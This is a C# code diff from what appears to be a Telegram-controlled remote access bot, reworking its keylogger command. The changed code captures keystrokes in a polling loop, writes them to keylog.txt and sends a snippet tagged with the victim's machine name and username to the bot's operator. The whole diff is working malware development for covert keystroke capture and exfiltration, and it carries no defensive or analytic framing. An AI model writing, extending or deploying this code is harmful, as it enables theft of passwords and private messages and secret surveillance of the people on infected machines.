@@ -25,6 +25,8 @@ public static class CommandRegistry
     public static readonly ScriptEngine PythonEngine = Python.CreateEngine();
     public static ScriptScope PythonScope = PythonEngine.CreateScope();
     private static bool KeylogActive = false;
+    private static Func<List<uint>> KeylogKeyProvider = Keylogger.GetPressingKeys;
+    private static Func<uint, char> KeylogKeyMapper = WinAPI.MapVirtualKey;
 
     public static void InitializeCommands(ICollection<BotCommand> commandsList)
     {
@@ -1171,22 +1173,48 @@ public static class CommandRegistry
 
                     KeylogActive = true;
 
-                    StringBuilder mappedKeys = new StringBuilder();
-                    StringBuilder unmappedKeys = new StringBuilder();
+                    await using var keylogFileStream = new FileStream(
+                        "keylog.txt",
+                        FileMode.Create,
+                        FileAccess.Write,
+                        FileShare.Read,
+                        bufferSize: 4096,
+                        useAsync: true);
+                    using var streamWriter = new StreamWriter(
+                        keylogFileStream,
+                        Encoding.UTF8,
+                        bufferSize: 1024,
+                        leaveOpen: true);
+
+                    await streamWriter.WriteLineAsync("#Keylog entries (mapped and unmapped).");
+                    await streamWriter.WriteLineAsync("#Remember, mapped keylog is not the \"clear\" input.");
+                    await streamWriter.WriteLineAsync(string.Empty);
+
+                    const int snippetMaxLength = 1024;
+                    var snippetBuilder = new StringBuilder();
                     List<uint> lastKeys = new List<uint>();
 
                     while (KeylogActive)
                     {
-                        var keys = Keylogger.GetPressingKeys();
+                        var keys = KeylogKeyProvider();
                         if (!lastKeys.SequenceEqual(keys))
                         {
-                            foreach (var key in keys)
+                            if (keys.Count > 0)
                             {
-                                unmappedKeys.Append(key.ToString("X"));
-                                unmappedKeys.Append(';');
-                                mappedKeys.Append(WinAPI.MapVirtualKey(key));
-                                mappedKeys.Append(' ');
-                                unmappedKeys.Append(' ');
+                                var mappedBatch = string.Join(' ', keys.Select(KeylogKeyMapper));
+                                var unmappedBatch = string.Join(' ', keys.Select(key => key.ToString("X")));
+
+                                await streamWriter.WriteLineAsync($"Mapped: {mappedBatch}");
+                                await streamWriter.WriteLineAsync($"Unmapped: {unmappedBatch}");
+                                await streamWriter.WriteLineAsync(string.Empty);
+                                await streamWriter.FlushAsync();
+
+                                snippetBuilder.Append(mappedBatch);
+                                snippetBuilder.Append(' ');
+                                if (snippetBuilder.Length > snippetMaxLength)
+                                {
+                                    snippetBuilder.Remove(0, snippetBuilder.Length - snippetMaxLength);
+                                }
                             }
 
                             lastKeys = new List<uint>(keys);
@@ -1195,29 +1223,15 @@ public static class CommandRegistry
                         await Task.Delay(50);
                     }
 
-                    await using var keylogFileStream = new FileStream(
-                        "keylog.txt",
-                        FileMode.Create,
-                        FileAccess.Write,
-                        FileShare.None,
-                        bufferSize: 4096,
-                        useAsync: true);
-                    using var streamWriter = new StreamWriter(
-                        keylogFileStream,
-                        Encoding.UTF8,
-                        bufferSize: 1024,
-                        leaveOpen: true);
-                    await streamWriter.WriteLineAsync("#Mapped keylog:");
-                    await streamWriter.WriteLineAsync(mappedKeys.ToString());
-                    await streamWriter.WriteLineAsync("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
-                    await streamWriter.WriteLineAsync(unmappedKeys.ToString());
-                    await streamWriter.WriteLineAsync("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
+                    await streamWriter.WriteLineAsync("#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
+                    await streamWriter.FlushAsync();
 
                     var recipientId = model.Message.From?.Id ?? model.Message.Chat.Id;
 
+                    var snippet = snippetBuilder.ToString().Trim();
                     await Program.Bot.SendMessage(
                         recipientId,
-                        "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys);
+                        "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + snippet);
 
                     await using var fs = new FileStream(
                         "keylog.txt",
